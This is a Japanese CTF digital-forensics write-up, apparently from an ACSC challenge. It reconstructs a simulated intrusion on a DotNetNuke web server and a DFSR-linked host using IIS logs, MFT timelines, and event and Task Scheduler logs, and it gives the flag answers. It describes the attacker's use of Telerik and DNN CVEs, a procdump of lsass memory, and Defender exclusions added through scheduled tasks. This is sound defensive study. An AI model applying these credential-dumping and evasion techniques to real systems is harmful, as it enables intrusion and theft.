![image](https://github.com/user-attachments/assets/c11be28f-3bc6-4e7f-ad04-ae1a0808e3f0)![image](https://github.com/user-attachments/assets/d5a67b6a-445d-484a-be45-a94a00825d54)![image](https://github.com/user-attachments/assets/1f3107ee-7192-4e9f-ada9-35e0a5062dc8)![image](https://github.com/user-attachments/assets/744f3b28-4278-4f5e-9286-04b6617e7340)# 1 GS-3 
## (1) 問題
![image](https://github.com/user-attachments/assets/7d4efb99-a007-4482-a998-7a94fc466b8d)

## (2) 方針
* volatility3でメモリダンプを見てイメージの取得された時刻を探る
* メモリダンプのタイムスタンプを見る

## (3) 実行
### ◇ メモリダンプのタイムスタンプを見る
![image](https://github.com/user-attachments/assets/1b653ad1-bf0c-4b08-8b34-6173ec6e62b1)

* 2021/04/06 1:58(UTC + 0900)
* 細かい秒数までは、わからなかった。

### ◇ volatility3を用いて行う
```
python3 vol.py -f "C:\Users\ttu-user.000\Desktop\ACSC-CTF\Files\workstation1.alien.local-memory\memory.raw" windows.info
```
![image](https://github.com/user-attachments/assets/d68ea284-a382-4227-a35f-bec70e4e42e5)

* 「2021-04-06 01:56:57+00:00」だった
* 記録した時のシステムの情報も載ることが分かった
* メモリダンプのタイムスタンプとは、2分ぐらいずれていた。
## (4) 参考資料
### ◇ volatility3
https://github.com/volatilityfoundation/volatility3

# 2 GS-4
## (1) 問題
![image](https://github.com/user-attachments/assets/74db62ac-7d2f-41e4-a75b-c0c68704f07c)
```
ALIENが一般に公開するWebサイトで使用しているコンテンツマネジメントプラットフォームは何ですか？

フラグ形式：プラットフォーム名

"What website content management platform are ALIEN using for their public facing website?

Flag format: NameOfPlatform"
```

## (2) 方針
* webサーバのデータが提供されているのでこれを確認する
* データに含まれる、ジャーナルを解析する

## (3) 実行
### ◇ データの確認
![image](https://github.com/user-attachments/assets/27ee3be5-a5a4-4c45-9208-e9a48cfe1fa8)

最小限のデータの収集であった。

### Usersは以下のユーザのデータ
ディレクトリにあるものとしては、特質するものはなかった。

### inetdbのログ
![image](https://github.com/user-attachments/assets/a476652d-7d3a-4bf9-8f18-0be858c69a07)

IISで動いているのは分かった。

* 特徴的なところを調べてみると
DotNetNukeであった。
# 3 IA-1
## (1) 問題
![image](https://github.com/user-attachments/assets/4542f413-d323-4a66-9f2b-8ea53bb220a3)
```
u_ex210331.log
```
* 失敗しているようなので
## (2) 方針
* 先程得たログを用いて検索をかける
* CMS(DotNetNuke)の既知の脆弱性を検索し、これが実施されていないか調べる

## (3) 実施
### ◇ アクセスされたディレクトリの列挙
```
cat *.log | grep -v "#" | cut -d" " -f 5 | sort | uniq > directorys.txt
```

```
/
/Contact
/Default.aspx
/DesktopModules/Admin/Authentication/module.css
/DesktopModules/Admin/Security/Scripts/dnn.PasswordComparer.js
/DnnImageHandler.ashx
/Images/icon-validate-fail.png
/Images/icon-validate-success.png
/Install/Install.css
/Install/InstallWizard.aspx
/Install/InstallWizard.aspx/IsInstallerRunning
/Install/InstallWizard.aspx/RunInstall
/Install/InstallWizard.aspx/ValidateInput
/Install/InstallWizard.aspx/ValidatePassword
/Install/InstallWizard.aspx/ValidatePermissions
/Install/InstallWizard.aspx/VerifyDatabaseConnection
/Install/InstallWizard.aspx/VerifyDatabaseConnectionOnLoad
/Install/install.css
/Install/installstat.log.resources.txt
/Mission
/Portals/0/Images/background_header.gif
/Portals/0/Images/icon-blog.png
/Portals/0/Images/icon-btn-sm-circle-arrow-shadow.png
/Portals/0/Images/icon-btn-sm-circle-arrow.png
/Portals/0/Images/icon-qa.png
/Portals/0/Images/icon-shop.png
/Portals/0/Images/icon-social-facebook.png
/Portals/0/Images/icon-social-linkedin.png
/Portals/0/Images/icon-social-twitter.png
/Portals/0/Images/icon-social-youtube.png
/Portals/0/Images/icon-videos.png
/Portals/0/Images/icon-webinars.png
/Portals/0/Images/icon-wikis.png
/Portals/0/Images/logo.png
/Portals/0/home.css
/Portals/0/portal.css
/Portals/_default/Skins/Xcillion/Menus/MainMenu/MainMenu.css
/Portals/_default/Skins/Xcillion/bootstrap/css/bootstrap.min.css
/Portals/_default/Skins/Xcillion/bootstrap/js/bootstrap.min.js
/Portals/_default/Skins/Xcillion/css/jquery.smartmenus.bootstrap.css
/Portals/_default/Skins/Xcillion/images/message_icon.png
/Portals/_default/Skins/Xcillion/images/notification_icon.png
/Portals/_default/Skins/Xcillion/images/search-icon.png
/Portals/_default/Skins/Xcillion/images/search.png
/Portals/_default/Skins/Xcillion/js/jquery.smartmenus.bootstrap.js
/Portals/_default/Skins/Xcillion/js/jquery.smartmenus.js
/Portals/_default/Skins/Xcillion/js/scripts.js
/Portals/_default/Skins/Xcillion/skin.css
/Portals/_default/Skins/_default/WebControlSkin/Default/ComboBox.DnnBlack.css
/Portals/_default/admin.css
/Portals/_default/default.css
/Portals/_default/skins/_default/WebControlSkin/default/combobox.default.css
/Resources/Search/SearchSkinObjectPreview.css
/Resources/Search/SearchSkinObjectPreview.js
/Resources/Shared/Components/DropDownList/dnn.DropDownList.js
/Resources/Shared/Components/FileUpload/dnn.FileUpload.css
/Resources/Shared/Components/FileUpload/dnn.FileUpload.js
/Resources/Shared/Scripts/dnn.jquery.js
/Resources/Shared/Scripts/jquery/jquery-ui.min.js
/Resources/Shared/Scripts/jquery/jquery.fileupload.js
/Resources/Shared/Scripts/jquery/jquery.hoverIntent.min.js
/Resources/Shared/Scripts/jquery/jquery.iframe-transport.js
/Resources/Shared/components/DropDownList/dnn.DropDownList.css
/Resources/Shared/scripts/TreeView/dnn.DynamicTreeView.js
/Resources/Shared/scripts/TreeView/dnn.TreeView.js
/Resources/Shared/scripts/dnn.DataStructures.js
/Resources/Shared/scripts/dnn.PasswordStrength.js
/Resources/Shared/scripts/dnn.WebResourceUrl.js
/Resources/Shared/scripts/dnn.extensions.js
/Resources/Shared/scripts/dnn.jquery.extensions.js
/Resources/Shared/scripts/dnn.jquery.tooltip.js
/Resources/Shared/scripts/jquery/dnn.jScrollBar.css
/Resources/Shared/scripts/jquery/dnn.jScrollBar.js
/Resources/Shared/scripts/jquery/jquery-migrate.min.js
/Resources/Shared/scripts/jquery/jquery.min.js
/Resources/Shared/scripts/jquery/jquery.mousewheel.js
/Resources/Shared/stylesheets/dnn.PasswordStrength.css
/Resources/Shared/stylesheets/dnndefault/7.0.0/default.css
/Resources/libraries/jQuery-UI/01_11_03/jquery-ui.js
/Resources/libraries/jQuery/01_09_01/jquery.js
/ScriptResource.axd
/Telerik.Web.UI.WebResource.axd
/WebResource.axd
/admin/ControlPanel/ControlBar.css
/admin/ControlPanel/controlbarimages/icon-edit-mode-input.png
/admin/ControlPanel/controlbarimages/menuArrow.png
/admin/controlpanel/controlbarimages/dnnLogo.png
/dfsr-reports/Health-alien_webdev-31Mar2021-0421.xml
/favicon.ico
/global.aspx
/images/Branding/DNN_logo.png
/images/InstallWizardBG.png
/images/branding/DNN_logo.png
/images/checkbox.png
/images/closeBtn.png
/images/dnnSpinnerDownArrow.png
/images/finishflag.png
/images/flags/de-DE.gif
/images/flags/en-US.gif
/images/flags/es-ES.gif
/images/flags/fr-FR.gif
/images/flags/it-IT.gif
/images/flags/nl-NL.gif
/images/helpI-icn-grey.png
/images/installer-feedback-states-sprite.png
/images/pin-icn.png
/images/progress.gif
/images/radiobutton.png
/images/videoIcon.png
/js/dnn.js
/js/dnn.modalpopup.js
/js/dnn.servicesframework.js
/js/dnncore.js
/portals/0/Images/logo2.png
/portals/0/images/logo-evoq-content.png
/portals/0/images/logo-evoq-social.png
/portals/_default/skins/Gravity/images/body_bg.jpg
/resources/shared/scripts/dnn.controlBar.js
/submit.aspx
```

* installとかcontorolpanelとか怪しそうだけどわからない。

### ◇ User-Agent の列挙(使用したツール名とかわかるかも)
```
cat *.log | grep -v "#" | cut -d" " -f 10 | sort | uniq | cut -d"/" -f 1 | uniq > user-agents.txt
```

```
Mozilla
Opera
curl
python-urllib3
```

* curlとurllib3(python)怪しすぎ、

### ◇ 怪しいツールを利用しているユーザを探す
curl及びpython-urllib3を利用しているユーザを列挙する
1. logからメソッド、ディレクトリ、リモートIP、ユーザエージェント、レスポンスコードのみをProcessed-log.txtに出力させる
```
cat *.log | grep -v "#" | cut -d" " -f 4,5,9,10,12 > Processed-log.txt
```
2. Processed-log.txtから、curl及びpython-urllib3を利用しているユーザを列挙する
```
cat Processed-log.txt  | grep -e curl -e python-urllib3
```

![image](https://github.com/user-attachments/assets/41afa340-8e78-490a-88fe-28b9f8634aa3)

* Postを送っていいたが、500番で最初に失敗してしていた。
* 13.54.35.87を利用していた

これによって13.54.35.87を怪しいと考える。
### ◇ 見つかった不審IPに対し検索をかける
```
cat log.txt | grep 13.54.35.87
```
![image](https://github.com/user-attachments/assets/a5a46ad5-24bd-4e10-bb84-62b8f64bdb8b)
* ① /Install/InstallWizard.aspxにアクセスしようとしており
* ② 404で失敗していた。

よって、13.54.35.87だと分かった。

# 4 IA-2
## (1) 問題
![image](https://github.com/user-attachments/assets/2c3db575-d8b8-415a-b0a5-dc49c7cea613)
```
攻撃者は最終的に、複数の脆弱性を組み合わせてアクセスに成功したようです。その中で最新のものはどれですか？

フラグフォーマット: cve-数値-数値

"It looks like the actor eventually succeeded in gaining access using a combination of multiple well-documented CVEs. Which of these is the most recent?

Flag format: cve-1-1"
```

## (2) 方針
1. 先程、見つかった不審IPに対し、検索をかける
2. 見つかったアクセスに関し、攻撃の可能性があるものを検索する

## (3) 実行
### ◇ /Install/InstallWizard.aspxに対するアクセス(失敗したと思われる攻撃)
![image](https://github.com/user-attachments/assets/2af93b43-776c-4f15-9d9c-f66f3b544365)
https://jvndb.jvn.jp/ja/contents/2015/JVNDB-2015-007365.html
  
CVE-2015-2794

### ◇ /Telerik.Web.UI.WebResource.axd に対するアクセス(一部200で帰ってきていた)
![image](https://github.com/user-attachments/assets/20f382eb-2e37-4df4-9d3d-0fa898f3859b)
https://news.sophos.com/ja-jp/2022/06/15/telerik-ui-exploitation-leads-to-cryptominer-cobalt-strike-infections-jp/

telerik UIというWeb アプリケーションを構築するためのコンポーネントとテーマのセットの脆弱性をついた攻撃と考えられる。
  
CVE-2019-18935 

### ◇ /submit.aspx
わからなかったしかしながら何かを送信できそうではある


### ◇ それ以外
それ以外でglobal.aspx

よくわからん
# 5 IA-3
## (1) 問題
![image](https://github.com/user-attachments/assets/b0cc00b9-8570-482d-9c69-673592035037)
```
攻撃が成功したことを確かめるために攻撃者が最初に作成したファイルの名前は？ (このテストファイルを"sample1"と呼ぶことにします)

フラグ・フォーマット： filename.ext

"What was the filename of the first file created by the actor to test that their exploit worked? (We'll refer to this test file as sample 1)

Flag format: filename.ext"
```

## (2) 方針
* このアクセス時刻近辺に作成されたファイルをMFTレコードで探す


## (3) 実行
### ◇ 時刻を絞る
![image](https://github.com/user-attachments/assets/d0bb64d8-b472-4f9c-b124-3652fe7af545)
* 2021-04-01 02:49:28以降を調べる！！

### ◇ MFTECmd.exeを用いてmftのタイムラインを作成する
```
MFTECmd.exe -f "$MFT" --csv "mft_timeline" --fl
```

#### 起こったエラー
古いMFTECmdを利用していたため発生した
![image](https://github.com/user-attachments/assets/55c4bc70-07e8-4f6e-832b-01d8ae7df013)
* dot NET 6.0が必要であったが、なかったので
* 「.net」と調べてMicrosoftからダウンロード

#### 実行
![image](https://github.com/user-attachments/assets/7f8c9cca-e353-463e-9f25-b40d8b6b1866)
* 見っけたー
* .\Windows\Temp\1617245455.5314393.dll

## (4) 参考文献
* 「Windows ファストフォレンジック解析手順書？ by fujifuji」  
自分が作った紙です。

# 5 IA-4
## (1) 問題
![image](https://github.com/user-attachments/assets/4d7a6228-0bfa-4910-a17b-3a62bbeb65b2)
```
Webサーバへのアクセスを得た攻撃者はついに核となるツール、"sample2"のドロップに成功しました。このツールが最初に使われたのは何時(UTC)ですか？

フラグフォーマット： yyyy-mm-dd hh:mm:ss

"After calling home, the actor finally succeeded in dropping their core tool, sample 2. What time (UTC) was this tool first used?

Flag format: yyyy-mm-dd hh:mm:ss"

```

## (2) 方針
* まずsample2のドロップ時期を探る、その後、/Windows/Prefechは以下を見て同じくらいに作成されたものを探す


## (3) 実行
### ◇ sample2(２回目にドロップされたファイル)を見つける
![image](https://github.com/user-attachments/assets/2b093eda-cf36-4c2f-bec8-3c72cc6cea5b)
* sample1のすぐ後ろにあった

### ◇ 実行時期を探る
* sample2以降の作成以降に.netの一時フォルダにdllが作成されていた
![image](https://github.com/user-attachments/assets/53a32643-61ff-4202-b005-4678b891914f)

### ◇ .netの一時フォルダに作成されていたファイル
* `.\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\root\a056c683\f67bca3c\submit.aspx.cdcab7d2.compiled`
* `.\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\root\a056c683\f67bca3c\App_Web_aa0aecbt.dll`

### ◇ \Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Filesについて調べる
\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files は、ASP.NETが、Web アプリケーションをコンパイルしたときに一時的に生成されるアセンブリが保存されるフォルダーだった。

#### つまりどうゆうことか
つまり、「`submit.aspx.cdcab7d2.compiled`、`App_Web_aa0aecbt.dll`」は、ダウンロードされたものではなく、何らかのコードによって生成されたファイルとわかる。

#### つなげて考えてみる
sample2の作成後、連続して、「`submit.aspx.cdcab7d2.compiled`、`App_Web_aa0aecbt.dll`」が作成されていた。これは、sample2の実行により、できたものだと考えられる！！

### ◇ 結論
「`submit.aspx.cdcab7d2.compiled`、`App_Web_aa0aecbt.dll`」の作成日時がsample2の実行時刻 ⇒ 2021-04-01 02:55:29
## (4) 参考文献
`\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files`について書いてあった：https://manage.accuwebhosting.com/knowledgebase/5034/How-to-Clear-the-ASP.NET-Temporary-files-in-Windows.html

# 6 LM-1
## (1) 問題
![image](https://github.com/user-attachments/assets/9c8d6557-e570-464b-a341-479979d0ef39)
```
”sample 2”をドロップした直後に攻撃者は興味深いファイルをダウンロードしたようです。 このファイルは、どのプロセスに関連しているのでしょうか？

フラグ・フォーマット：ABCD

"Shortly after dropping sample 2 on disk, the actor seems to have downloaded an interesting looking file. What service does this file relate to?

Flag format: ABCD"
```

## (2) 方針
* ウィンドウズログから見る
* MFTのタイムラインから見る
* ダウンロードされているのでsample2がドロップされた時間帯のWebのアクセスログを確認する
## (3) 実行
### ◇ Windowsログから見る、タイムラインから見る
いろいろアクセス等が分かったが、実際にダウンロードされているかなどは分からなかった。
これにかなり無駄な時間を割いてしまった。アクセスしていたものとか
### ◇ webのログを確認する
![image](https://github.com/user-attachments/assets/a8e3219d-80be-4bd0-8d78-790ba3bf8a39)

* /dfsr-reports/Health-alien_webdev-31Mar2021-0421.xmlというファイルがダウンロードされていた。

#### dfsr-reportsとは
DFSRのレポート
#### DFSRとは
* DFSレプリケーションのファイルで、分散ファイル システム レプリケーション(DFS レプリケーション) * 複数のサーバーやサイト間で効率的にフォルダーをレプリケートできる Windows Server の役割サービス。
* DFS 名前空間パスで参照されるフォルダーを含め、すべての種類のフォルダーを複製できる。

⇒ つまり、サーバ間でフォルダーを複製して、同期とかバックアップとかに利用できる役割サービスってこと
### ◇ 結論
DFSRに関係するファイル！！

## (4) 参考文献
DFSRについて：https://learn.microsoft.com/ja-jp/windows-server/storage/dfs-replication/dfsr-overview

# 6 LM-2
## (1) 問題
![image](https://github.com/user-attachments/assets/7b412292-b859-4662-ab65-98cfb5b2da2a)
```
Webサーバーは、DFSRを介してネットワーク上の別のホストに接続されました。 DFSR経由でDMZのWebサーバーとつながっているサーバーのホスト名はなんでしょう？

フラグ形式：ホスト名

"So the DMZ webserver was connected via DFSR to another host on the network. What is the hostname of the server that is linked to the DMZ webserver through DFSR?

Flag format: Hostname"
```
## (2) 方針
* windowsのセキュリティイベントログからネットログインまたは、サービスログインを確認する

## (3) 実行
### ◇ Windowsセキュリティイベントの確認
注意：解析端末上のイベントビュアーで見ているため、時刻が日本標準時(+0900)になっているので、「-0900」で見てください。
![image](https://github.com/user-attachments/assets/6b432d76-e3b0-4671-bc6e-aea9cae0aabc)

![image](https://github.com/user-attachments/assets/18dd2d13-6716-4575-b487-8749e1fbec25)

* 10.2.0.196及び10.1.0.80からネットログイン(LogonType : 3)でRCPポートを用いてログイン処理がされていることが分かった
* しかしながら、DFSRで実行されているのかは、不明
* dev_agarnderユーザにログインされていた
* jadminユーザにログインされていた

### ◇ jadminについて
* JUMPHOST1というワークステーションにいた(つまり、jadminはドメインユーザではない)
* jadminを持つマシンがあるかもしれない

### ◇ DFSRに関連するイベントログを確認する
![image](https://github.com/user-attachments/assets/927c514f-cf9e-43f4-8874-080b44a5d966)

corp-webdevと接続していた

### 結論
corp-webdevだ！！

# 7 LM-3
## (1) 問題
![image](https://github.com/user-attachments/assets/af320556-0336-47e6-9030-1912c9aea082)
```
DFSRということは？ ファイルの移動と関係があるのでは？ "sample2"が他のサーバーにコピーされた可能性はありませんか？

レプリケーションフォルダのファイルパスはどうなっていたのでしょうか？

フラグフォーマット: c:\a\file\path

この問題に正答すると「Miscellaneous」の「1」が解放されます

"DFSR? Doesn't that have something to do with moving files around? Could sample 2 have been copied onto another server?

What was the filepath of the replicated folder?

Flag format: c:\a\file\path"
```

## (2) 方針
先程のイベントログから共有しているファイルを読み取る

## (3) 実行
![image](https://github.com/user-attachments/assets/2f0e84f4-3ade-4c15-9be8-bbd8167e8086)
![image](https://github.com/user-attachments/assets/2ed0aa29-e61f-443e-be64-bf00566eb4c7)

* testdfsrとC:\inetpub\wwwroot\alieｎが作成されていた

# 8 LM-4
## (1) 問題
![image](https://github.com/user-attachments/assets/5e349fbb-d00d-4456-b6c8-00bbca56eb3b)
```
"sample2"はCORP-WEBDEVにコピーされましたが、攻撃者がDFSRの設定を把握していたかどうか、コピーしたファイルにアクセスが成功していたかどうかはわかりません。ありがたいことに、ALIENはCORP-WEBDEVのデータも提供してくれたので、調査が継続できそうです。

攻撃者がCORP-WEBDEV上の"sample2"を操作できるかどうか確かめたのは何時（UTC）ですか？

フラグ形式： yyyy-mm-dd hh:mm:ss

"So sample 2 was replicated onto CORP-WEBDEV, but we don't know if the actor were aware of the DFSR setup, or if they were able to access the replicated sample. Thankfully, ALIEN have provided data from CORP-WEBDEV for us to continue the investigation.

What time (UTC) did the actor test their ability to interact with the copy of sample 2 on CORP-WEBDEV?

Flag format: yyyy-mm-dd hh:mm:ss"
```

## (2) 方針
* CORP-WEBDEVのウェブのログを確認する！！
* submit.aspx.cdcab7d2.compiledが出ていたのでsubmitに関連するファイルへのWebアクセスであればこの可能性が高い

## (3) 実行
1. CORP-WEBDEVのwebログファイルを見やすいように加工
```
cat *.log | grep -v "#" | cut -d" " -f 1,2,4,5,9,12 > processed-log.txt
```
2. 2021-04-01に絞って検索
![image](https://github.com/user-attachments/assets/a403296d-7578-4779-be38-3ab59d7affd1)

* submitは10.1.0.80(dev_agarnder)でみられていた。
* 2021-04-01 03:03:16に初めに確認していた(GET)

# 9 PE-1
## (1) 問題
![image](https://github.com/user-attachments/assets/dd518c55-1679-4baa-82bd-7cb04cf0350a)
```
攻撃者はさらにいくつかの偵察コマンドを実行したようですが、その後始末は怠ったようです。

偵察コマンドの出力結果を含むと思われるファイルが作成された時刻(UTC)は？

フラグ・フォーマット: yyyy-mm-dd hh:mm:ss

この問題に正答すると「Miscellaneous」の「2」が解放されます

"It looks like the actor ran some more reconnaissance commands and, once again, forgot to clean up after themselves.

What time (UTC) was the file containing the command's output created?

Flag format: yyyy-mm-dd hh:mm:ss"
```
## (2) 方針 
* fulldir.txtが先程のログで見つかったのでこれを探す

## (3) 実行
![image](https://github.com/user-attachments/assets/33f64d6f-1f8f-4f1f-a702-b9344ead4d7c)
3:08:14だった
# 9 PE-2
## (1) 問題
![image](https://github.com/user-attachments/assets/4cc60c8d-1315-4daa-b162-128fd7f2e69e)
```
攻撃者がこれらのコマンドを実行した際に使用したユーザーアカウントは？

フラグ・フォーマット: domainname\accountname

この問題に正答すると「Miscellaneous」の「3」が解放されます

"What user account was the actor running these commands as?

Flag format: domainname\accountname"
```

## (2) 方針
* 2021-04-01 03:08:14の近くで実行または、ログインしていたユーザアカウントを探す。
* fulldir.txtなのでディレクトリに対する調査を行ったと考え、Powershellの実行がないか調べる
* WMIの実行を確認する
* windows defenderのログを確認する
* 

## (3) 実行
### ◇ powershellの実行
同じくらいの時間帯に実行された攻撃は、なかったが、興味深い、psmapの実行が見つかった
![image](https://github.com/user-attachments/assets/ce9fbe6c-3b36-49d0-b572-841f5376cc0b)
* C:\inetpub\wwwroot\alien\legit.zipが作成されていた。
* このファイルイベントファイルじゃなかった
* 以下のファイルでないといけなかった
```
Microsoft-Windows-PowerShell%4Operational
```

### ◇ powershellの実行(コマンドの実行を見るぞ) corp側
`Microsoft-Windows-PowerShell%4Operational`を確認する
![image](https://github.com/user-attachments/assets/809bdfeb-ae75-44f1-86e2-1bc0f414adee)
* 時間帯は近くないがIIS APPPOOL\alienがなぜかPowershellコマンドを実行していた。
* 通常、psmapを利用しないはずなのに!!

### ◇ wmiのコマンド実行を確認する
時間帯は違うが、DMZ-WEBPUB\administratorでWmiが実行されていた(ISAの情報を取得していた。)
![image](https://github.com/user-attachments/assets/ea732575-011f-4ed6-b296-798e682d278c)

### ◇ corp-webdevのWindowsDefenderのログ
![image](https://github.com/user-attachments/assets/06490524-151e-4a1c-bdf2-69fde6dbf817)
* 時間帯は近くないが、`2021/04/01 5:12:01`に**sysinternalsは以下がDefenderのスキャンの対象外のディレクトリに設定されていた。**

### ◇ corp-webdevのMFTを確認
#### 見つかったもの1つ目
![image](https://github.com/user-attachments/assets/861c4107-4c28-4aed-b082-1351f4a6ffe3)
* container.datがdev_agardnerの配下で作成されていた。

#### 見つかったもの2つ目
![image](https://github.com/user-attachments/assets/525e8b72-5a3d-4358-899d-9568b3514812)
* 2021-04-01 03:22:14 netstat.txtが作成(netstatコマンドが実行されていた
* 2021-04-01 04:07:32 psmap.zipが落とされた

#### 見つかったもの3つ目
![image](https://github.com/user-attachments/assets/1074f0ed-bcbf-4fc3-baa7-39f544a45d4f)
* Collector_velociraptor-v0.5.7-windows-amd64.exeが

#### 見つかったもの4つ目
![image](https://github.com/user-attachments/assets/5431d26c-19ef-4094-9c17-1dd795f65119)
* 2021-04-01 03:30:34 - alien_dbのフォルダが作成されていた。
* 2021-04-01 03:29:23 - Windows NUPdateのタスクが作成されていた.

#### 見つかったもの5つ目
![image](https://github.com/user-attachments/assets/27ab39f2-8f01-4a65-9297-083ac6cbd437)
* PowershellのフォルダにStartupProfileData-NonInteractiveが実行されていた。

### ◇ 結論
Webから攻撃を受けたということと、インストールされたインターナルのWindowsツールを使用していたことからIIS APPPOOL\alienで攻撃したのだと考えられる

## (4) 参考文献
IIS APPPOOLとは：https://aspnet.keicode.com/aspnet/aspnet-apppool.php

# 10 PE-3
## (1) 問題
![image](https://github.com/user-attachments/assets/096a49ff-fc47-487e-9fa4-51bf41f903c9)
```
 100
攻撃者が攻撃を継続するためには、より高い権限を持つ正当な認証情報が必要でした。攻撃者が使用したより高い権限を持つアカウント名はなんですか？

フラグ形式：アカウント名

この問題に正答すると「Miscellaneous」の「4」が解放されます

"The actor needed legitimate credentials with higher privilege to continue their attack. What account did they use which had higher privileges?

Flag format: accountname"
```
webサーバは、IP が10.1.1.110だった。
## (2) 方針 
* ログインを確認する
![image](https://github.com/user-attachments/assets/702db1d1-9b0a-4934-91ec-2a6083e19a67)
* すでにalien_dbのユーザフォルダの作成を発見していたのでこれが利用されていると考える
## (3) 実行
### ◇ 獲得していたalien_dbの情報
2021-04-01 03:30:34 - alien_dbのフォルダが作成されていた。

### ◇ alien_dbのセキュリティログを調べる
注意：解析端末上のイベントビュアーで見ているため、時刻が日本標準時(+0900)になっているので、「-0900」で見てください。
![image](https://github.com/user-attachments/assets/89ece09c-469e-4187-b933-e98258cd5089)
* 2021/04/01 3:29:23 にドメインに対する認証が行われていた。

![image](https://github.com/user-attachments/assets/4cf8cc3c-c824-4ffd-b94c-513991bec35e)
* 多くの特権が与えられている。


### ◇ まとめる

マシン上にユーザプロファイル(ユーザのディレクトリ)のないドメインユーザにログインしたことがわかるためalien_dbのユーザに勝手にログイン(権限昇格)されたと考えられる

### ◇ M-4
dotnetnukeの利用アカウントなのでdotnetnukeのユーザパスの管理方法を調べる
![image](https://github.com/user-attachments/assets/a1009dbb-24f4-4eb3-bfe6-e1fcddc0b616)
`web.config`にあるようだ

https://www.ephost.com/account/knowledgebase/344/How-to-find-your-MS-SQL-User-Pass-for-your-DNN-installation.html
# 11 PE-4
## (1) 問題
![image](https://github.com/user-attachments/assets/aae94089-d381-4ab5-9d99-722b29c039a5)
## (2) 方針？
その前のセキュリティログの検索で2021/04/01 3:29:23 にドメインに対するalien_dbの認証が実施されていたのでこれだと考えられる。
## (3) 考察(推測)
同時刻、03:29:23に「Windows NUPdate」のタスクが作成されていたので、このalien_dbの資格情報を利用して、corp-webdevに悪意のあるタスクを作成し、権限昇格したのだ思われる。

# 12 PE-5
## (1) 問題

```
新しい認証情報を活用し、攻撃者はプロセスを開始しました。この最初のプロセスのPIDは何でしょうか？

フラグ形式です。PID

"Continuing to flex their new credentials, the actor then started a process. What was the PID of this first process?

Flag format: PID"
```
## (2) 方針
PE-3の時得たMFTの情報から`Windows NUPdate`タスクが作成されたと考えられる
![image](https://github.com/user-attachments/assets/5431d26c-19ef-4094-9c17-1dd795f65119)
* なのでWindowsTaskSchedulerのログを確認する

* タスクスケジューラのログでプロセスの登録イベントIDは`106`
## (3) 実行
### ◇ TaskSchedulerのログを確認する
Microsoft-Windows-TaskScheduler/Operationalを確認
![image](https://github.com/user-attachments/assets/b41a7141-cd08-47c4-958f-93e39904675e)
* このタスクは、やはり、alian_dbによって実行されていた
![image](https://github.com/user-attachments/assets/c918a7fc-c0ff-46a3-bf75-22319a00cd2c)
* 一番初めにprocdump.exeが実行されていた。権限昇格のために重要なプロセスをダンプしたと思われる
* PID 5372で実行されていた

### ◇ Windows\system32\Taskディレクトリ以下を確認
![image](https://github.com/user-attachments/assets/80416930-3f37-4ea0-8194-9eb30f58b5d5)
* こちらを見ても存在が確認できた。また、新たに、Windows YUPdateという不審タスクを発見した

![image](https://github.com/user-attachments/assets/67b0eded-405b-4899-9b88-58432f3885ea)
* sysinternalsフォルダは以下をディフェンダーのスキャンにさらされないように設定するタスクであった。

![image](https://github.com/user-attachments/assets/b106c0fc-b2c6-4e2a-a44b-a1860a60dfe2)
* どちらもIIS APPPOOL/alienによって登録されていた。

![image](https://github.com/user-attachments/assets/41bb1bbd-8b6b-4e6a-8992-b58e3299ea53)
* NUPdateでは、`procdump.exe`によって`lsass.exe`のプロセスのメモリが`lsass.dmp`としてダンプしていた。


### ◇ 結論
PID 5372で実行されている。また、確実にIIS APPPOOL/alienによって登録されていたことが分かった。


## (4) 文献
procdumpコマンドとは、：https://learn.microsoft.com/ja-jp/sysinternals/downloads/procdump

# 12 PE-6
## (1) 問題
![image](https://github.com/user-attachments/assets/1b27700f-fd22-492f-9b45-640e40a05753)

## (2) 方針
* 先程実行されていたコマンドがprocdumpであり、プロセスダンプをするコマンドなので.dmpファイルがないかMFTを用いて調べる

## (3) 実行
![image](https://github.com/user-attachments/assets/bc1ccfd1-c6a8-4b5b-8c78-0bd58f22adb1)
* 2021-04-01 lsass.dmpがあった

## (4) 考察(推測)
lsassの実行メモリがダンプされてしまっていることから、mimikatz等のツールを用いてcorp-webdevマシンの資格情報は、このマシンでログインされたユーザ及び利用したチケットが奪われたと考えられる

# 13 DD - 1
## (1) 問題
![image](https://github.com/user-attachments/assets/c2d4ef4e-3ac4-43a2-b671-8f9e8ca01207)
## (2) 方針
* MFTから不審ファイルの作成を調べる

## (3) 実行
### ◇ corp-webdevマシンのMFTを調べる
![image](https://github.com/user-attachments/assets/24f6949d-62b4-4b80-9e9f-6267be88b0bb)
* 2021-04-01 04:10:20 YUPdateを置きSysInternalsがディフェンダーのスキャン例外にしようとした後、「`psmap.zip`」が作成されていた
* 2021-04-01 04:11:42　にpsmapがzipから展開されていた
* 


### ◇ psmapについて
psmapは、sysinternalsには存在せず、AD用の攻撃のツールである「`psmapexec`」だと考えられる

## (4) 参考文献
psmapexec ：https://github.com/The-Viper-One/PsMapExec

# 14 DD - 2
## (1) 問題
![image](https://github.com/user-attachments/assets/723ce6cb-0b0f-4194-b18c-856d3a8763e0)

## (2) 方針
* 実行を容易にするためとあるのでディフェンダーの設定を変えられたとみて、ディフェンダーのログを見る。

### ◇ 前回得た情報より
* YUPdateタスクを用いてディフェンダーの設定を変えているかもしれないのでタスクスケジューラのログを見る
![image](https://github.com/user-attachments/assets/713a6fdd-8b6b-43c4-91a4-c67212965f8b)

## (3) 実行
### ◇ ディフェンダーのログ(corp-webdev)
![image](https://github.com/user-attachments/assets/b6c5f414-377c-44f6-b34f-50af25b4f0d2)
* 2021-04-01 05:12:01　defendeのスキャン例外を登録するレジストリに`sysinternals`のパスの値が入れられていた。

### ◇ タスクスケジューラのログを見る
![image](https://github.com/user-attachments/assets/01b52237-f91a-495f-87bb-45e8ac4fc75d)
* 2021/04/01 03:49:01 に`YUpdate`のタスクが登録されていた
![image](https://github.com/user-attachments/assets/49d89703-d40f-4283-9d85-caf235a7a103)
* 2021-04-01 03:50:00 YUPdateタスクの初めの実行は失敗していた。
![image](https://github.com/user-attachments/assets/a6ae513d-ed5c-4cc5-a9f9-d1227e9800d0)
* 2021-04-01 05:10:54 その後`YUPdate`タスクは、更新された
* 2021-04-01 05:12:00 「`Powershell.exe`」を実行していた。

### ◇ 考察(推測)
